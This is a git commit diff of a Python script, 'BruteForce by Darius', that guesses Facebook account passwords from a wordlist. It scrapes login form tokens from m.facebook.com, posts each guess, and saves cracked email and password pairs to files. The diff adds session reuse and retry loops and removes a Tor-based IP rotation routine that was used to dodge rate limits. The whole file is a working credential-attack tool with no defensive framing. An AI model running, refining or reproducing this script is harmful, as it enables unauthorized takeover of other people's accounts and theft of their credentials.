b8bbb22d965f500c4e368dd4b68fd28b4ce7fabc
black <63425602+dariusgab@users.noreply.github.com>
2022-05-21 22:11:48 +0800

    Add files via upload

--- facebook.py
+++ facebook.py
@@ -2,11 +2,13 @@
 import os.path
 import requests,json,re
 import sys,os,time
-logo=""" \033[1;92m_____              _                 _
-|  ___|_ _  ___ ___| |__   ___   ___ | | __
-| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
-|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
-|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
+session=requests.Session()
+logo=""" \033[1;92m███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
+██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
+█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝
+██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗
+██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
+╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
 BruteForce by Darius:"""
 if sys.version_info[0] != 3:
   os.system('clear')
@@ -26,26 +28,24 @@ COOKIES = {}
 def create_form():
     form = dict()
     cookies = dict()
-    try:
-      data = requests.get(POST_URL, headers=HEADERS)
-    except:
-      create_form()
-    try:
-      for cookie in data.cookies:
-        cookies[cookie.name]=cookie.value
-      action_url= re.findall(r'method="post" action="(.*?)"',data.text).pop(0)
-      value=re.findall(r'value="(.*?)"',data.text)
-      form['lsd']=value[0]
-      form['jazoest']=value[1]
-      form['m_ts']=value[2]
-      form['li']=value[3]
-      form['try_number']=value[4]
-      form['unrecognized_tries']=value[5]
-      form['login']=value[6]
-      form['bi_xrwh']=value[10]
-      return form, cookies, action_url
-    except:
-      create_form()
+    while True:
+      try:
+        data = session.get(POST_URL, headers=HEADERS)
+        for cookie in data.cookies:
+          cookies[cookie.name]=cookie.value
+        action_url= re.findall(r'method="post" action="(.*?)"',data.text).pop(0)
+        value=re.findall(r'value="(.*?)"',data.text)
+        form['lsd']=value[0]
+        form['jazoest']=value[1]
+        form['m_ts']=value[2]
+        form['li']=value[3]
+        form['try_number']=value[4]
+        form['unrecognized_tries']=value[5]
+        form['login']=value[6]
+        form['bi_xrwh']=value[10]
+        return form, cookies, action_url
+      except:
+        pass
 
 
 def na_hack_naba(email,password):
@@ -53,47 +53,25 @@ def na_hack_naba(email,password):
     BODY, COOKIES, URL = create_form()
     BODY['email'] = email
     BODY['pass'] = password
-    try:
-      r = requests.post('https://m.facebook.com{}'.format(str(URL)), data=BODY, cookies=COOKIES, headers=HEADERS)
-    except:
-      na_hack_naba(email,password)
-    try:
-      if "c_user" in r.cookies or "save-device" in r.url or "home.php" in r.url:
-        open('hacked.txt', 'a').write(str(email+' | '+password))
-        print(65 * '\033[1;92m=')
-        print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
-        print(65 * '\033[1;92m=')
-        return True
-      elif "checkpoint" in r.cookies or "checkpoint_title" in r.text or "checkpoint" in r.url:
-        open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password))
-        print(65 * '\033[1;92m=')
-        print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
-        print(65 * '\033[1;92m=')
-        return True
-    except:
-      na_hack_naba(email,password)
-    return False
-
-def change_ip():
-  try:
-    old=requests.get('http://checkip.amazonaws.com/')
-  except:
-    pass
-  while True:
-    try:
-      x=os.system('killall -HUP tor')
-      time.sleep(3)
-      ip=requests.get('http://checkip.amazonaws.com/')
-    except:
-      pass
-    try:
-      if old.text==ip.text:
+    while True:
+      try:
+        r = session.post('https://m.facebook.com{}'.format(str(URL)), data=BODY, cookies=COOKIES, headers=HEADERS)
+        if "c_user" in r.cookies or "save-device" in r.url or "home.php" in r.url:
+          open('hacked.txt', 'a').write(str(email+' | '+password))
+          print(65 * '\033[1;92m=')
+          print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
+          print(65 * '\033[1;92m=')
+          return True
+        elif "checkpoint" in r.cookies or "checkpoint_title" in r.text or "checkpoint" in r.url:
+          open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password))
+          print(65 * '\033[1;92m=')
+          print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
+          print(65 * '\033[1;92m=')
+          return True
+        else:
+          return False
+      except:
         pass
-      else:
-        return ip.text
-    except:
-      pass
-  
 if __name__ == "__main__":
   os.system('reset')
   os.system('clear')
@@ -113,21 +91,11 @@ if __name__ == "__main__":
       print('\033[1;91m[!] Error reading file')
       sys.exit(1)
     print('\033[1;92m[+] Passwords Number {}'.format(str(len(password_data))))
-    print('\033[1;92m[+] \033[1;91mPlease use Tor')
     print(65 * '\033[1;92m=')
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
-        elif int(len_pass)==18:
-          print(65 * '\033[1;92m=')
-          ip=change_ip()
-          try:
-            print('\033[1;92m[+] New phone: \033[;97m{}'.format(str(ip)))
-          except:
-            pass
-          len_pass=0
-        len_pass+=1
         print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
         if na_hack_naba(email,password):
           break
